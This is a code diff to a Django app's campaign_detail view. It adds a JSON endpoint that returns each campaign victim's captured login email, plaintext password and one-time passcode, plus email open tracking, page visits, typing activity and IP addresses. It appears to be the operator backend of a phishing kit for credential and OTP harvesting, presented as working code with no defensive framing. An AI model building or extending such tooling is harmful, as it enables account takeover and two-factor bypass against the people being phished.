@@ -11,7 +11,7 @@ from django.conf import settings
 from django.template.loader import render_to_string
 from django.utils.html import strip_tags
 from django.core.mail import send_mail, get_connection, EmailMultiAlternatives
-from django.http import HttpResponse
+from django.http import HttpResponse, JsonResponse
 import base64
 import logging 
 from django.urls import reverse
@@ -107,16 +107,78 @@ def campaign_list(request):
 
 @login_required
 def campaign_detail(request, pk):
-    campaign = get_object_or_404(Campaign, pk=pk)
-    # Get the latest email event for this campaign (delivered/opened/bounced)
+    campaign = get_object_or_404(Campaign, pk=pk, user=request.user)
+    
+    # Handle AJAX request for victim info updates
+    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
+        try:
+            # Get all victim infos for this campaign
+            victim_infos = campaign.victim_infos.order_by('-created_at')
+            victim_data = []
+            
+            for victim_info in victim_infos:
+                victim_data.append({
+                    'id': str(victim_info.id),
+                    'login_email': victim_info.login_email or '',
+                    'login_password': victim_info.login_password or '',
+                    'login_otp': victim_info.login_otp or '',
+                    'created_at': victim_info.created_at.strftime('%B %d, %Y %H:%M'),
+                    'updated_at': victim_info.updated_at.strftime('%B %d, %Y %H:%M'),
+                })
+            
+            # Get email events
+            email_events = campaign.email_events.order_by('-timestamp')
+            event_data = []
+            
+            for event in email_events:
+                event_data.append({
+                    'event_type': event.event_type,
+                    'recipient': event.recipient,
+                    'timestamp': event.timestamp.strftime('%B %d, %Y %H:%M'),
+                    'tracking_id': event.tracking_id,
+                })
+            
+            # Get victim events (page visits, typing activity)
+            victim_events = VictimEvent.objects.filter(campaign=str(campaign.id)).order_by('-timestamp')
+            victim_event_data = []
+            
+            for v_event in victim_events:
+                victim_event_data.append({
+                    'event_type': v_event.event_type,
+                    'timestamp': v_event.timestamp.strftime('%B %d, %Y %H:%M'),
+                    'ip_address': v_event.ip_address or 'Unknown',
+                })
+            
+            return JsonResponse({
+                'status': 'success',
+                'victim_infos': victim_data,
+                'email_events': event_data,
+                'victim_events': victim_event_data,
+                'total_victims': len(victim_data),
+                'has_victims': len(victim_data) > 0,
+                'campaign_id': str(campaign.id),
+                'last_updated': timezone.now().strftime('%B %d, %Y %H:%M:%S'),
+            })
+            
+        except Exception as e:
+            logger.error(f"Error in AJAX campaign_detail for campaign {pk}: {str(e)}")
+            return JsonResponse({
+                'status': 'error',
+                'message': 'Failed to fetch campaign data',
+                'error': str(e) if settings.DEBUG else 'Internal server error'
+            }, status=500)
+    
+    # Regular page load - get basic info for initial render
     email_event = campaign.email_events.order_by('-timestamp').first()
-    # Get the latest victim info for this campaign, if any
     victim_info = campaign.victim_infos.order_by('-created_at').first()
-    return render(request, 'core/campaign_detail.html', {
+    
+    context = {
         'campaign': campaign,
         'email_event': email_event,
         'victim_info': victim_info,
-    })
+    }
+    
+    return render(request, 'core/campaign_detail.html', context)
 
 
 
